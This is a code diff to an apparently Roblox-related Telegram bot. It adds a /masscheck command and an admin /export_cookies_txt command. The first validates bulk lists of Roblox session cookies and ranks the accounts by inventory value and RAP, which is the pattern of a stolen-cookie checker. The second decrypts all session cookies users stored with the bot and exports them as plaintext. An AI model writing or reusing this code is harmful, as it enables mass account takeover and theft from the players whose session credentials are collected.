@@ -34,7 +34,8 @@ from aiogram.filters import StateFilter
 
 from i18n import t, tr, get_user_lang, set_user_lang, set_current_lang
 from aiogram.filters import CommandStart, Command
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, InputMediaPhoto, BufferedInputFile
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, InputMediaPhoto, BufferedInputFile, \
+    Message
 
 ADMINS = set((int(x) for x in os.getenv('ADMINS', '').replace(',', ' ').split() if x))
 
@@ -4128,6 +4129,152 @@ def _check_antiflood(user_id: int, limit: int = 7, per_seconds: int = 10) -> boo
     ts_list.append(now)
     _user_msg_times[user_id] = ts_list
     return len(ts_list) > limit
+
+
+
+from aiogram.types import BufferedInputFile
+
+@router.message(Command("masscheck"))
+async def cmd_masscheck(message: Message):
+    # 1) ищем, к какому файлу привязаться: либо текущее сообщение, либо реплай
+    doc = message.document
+    if not doc and message.reply_to_message and message.reply_to_message.document:
+        doc = message.reply_to_message.document
+
+    if not doc:
+        return await message.answer(
+            "скинь .txt с куками:\n"
+            "• как документ с подписью /masscheck\n"
+            "• или отправь файл и ответь на него /masscheck"
+        )
+
+    if not doc.file_name.lower().endswith(".txt"):
+        return await message.answer("бро, нужен именно .txt 😭")
+
+    file = await message.bot.get_file(doc.file_id)
+    file_data = await message.bot.download_file(file.file_path)
+    content = file_data.read().decode("utf-8", errors="ignore").strip()
+
+    cookies = [c.strip() for c in content.splitlines() if c.strip()]
+    if not cookies:
+        return await message.answer("файл пустой, там даже куки нет 😬")
+
+    await message.answer(f"нашёл {len(cookies)} строк, ща пробегусь по ним...")
+
+    results: list[str] = []
+
+    for raw_cookie in cookies:
+        try:
+            # валидируем и одновременно получаем юзера
+            ok, cleaned_cookie, user_data = await validate_and_clean_cookie(raw_cookie)
+            if not ok or not user_data:
+                results.append("INVALID | - | - | -")
+                continue
+
+            rid = int(user_data["id"])
+            nickname = user_data.get("name") or ""
+
+            # инвент по куке
+            inv = await roblox_client.get_full_inventory_with_cookie(rid, cleaned_cookie)
+            try:
+                total_inv, _ = await _compute_totals_cached(0, rid, inv)
+            except Exception:
+                total_inv = 0
+
+            # RAP
+            try:
+                rap_info = await roblox_client.calc_user_rap(rid, cookie=cleaned_cookie)
+                rap_total = int(rap_info.get("total") or 0)
+            except Exception:
+                rap_total = 0
+
+            results.append(f"{nickname} | {rid} | {total_inv} | {rap_total}")
+
+        except Exception as e:
+            logger.error(f"[masscheck] error: {e}")
+            results.append("ERROR | - | - | -")
+
+    output = "\n".join(results) if results else "ничего не получилось обработать"
+
+    data = output.encode("utf-8")
+    out = BufferedInputFile(data, filename="mass_check_results.txt")
+    await message.answer_document(out, caption="mass-check готов 😎")
+
+
+
+from aiogram.types import BufferedInputFile
+from aiogram.filters import Command
+import io
+
+@router.message(Command("export_cookies_txt"))
+async def cmd_export_cookies_txt(msg: types.Message):
+    """Admin only: экспорт только кук в txt (по одной на строку)."""
+    uid = msg.from_user.id
+    if not is_admin(uid):
+        await msg.reply("🚫 доступ запрещён")
+        return
+
+    await msg.reply("🔎 Собираю куки...")
+
+    try:
+        accounts = await storage.list_accounts_distinct()
+    except Exception as e:
+        await msg.reply(f"❌ Ошибка при чтении аккаунтов: {e}")
+        return
+
+    if not accounts:
+        await msg.reply("⚠️ Аккаунтов не найдено.")
+        return
+
+    from util.crypto import decrypt_text
+
+    cookies: list[str] = []
+    seen: set[str] = set()
+
+    for acc in accounts:
+        try:
+            rid = int(acc.get("roblox_id") or 0)
+        except Exception:
+            continue
+
+        if not rid:
+            continue
+
+        # достаём любую зашифрованную куку этого rid
+        try:
+            enc = await storage.get_any_encrypted_cookie_by_roblox_id(rid)
+        except Exception:
+            enc = None
+
+        if not enc:
+            continue
+
+        try:
+            cookie_plain = decrypt_text(enc) or ""
+        except Exception:
+            continue
+
+        cookie_plain = cookie_plain.strip()
+        if not cookie_plain:
+            continue
+
+        # чтобы не было дублей
+        if cookie_plain in seen:
+            continue
+
+        seen.add(cookie_plain)
+        cookies.append(cookie_plain)
+
+    if not cookies:
+        await msg.reply("⚠️ Активных кук не нашёл.")
+        return
+
+    text = "\n".join(cookies)
+    payload = text.encode("utf-8")
+
+    doc = BufferedInputFile(payload, filename="cookies_export.txt")
+    await msg.answer_document(document=doc, caption="✅ Экспорт кук (txt)")
+
 
 LAST_MENU_MESSAGES: dict[int, int] = {}
 @router.message()
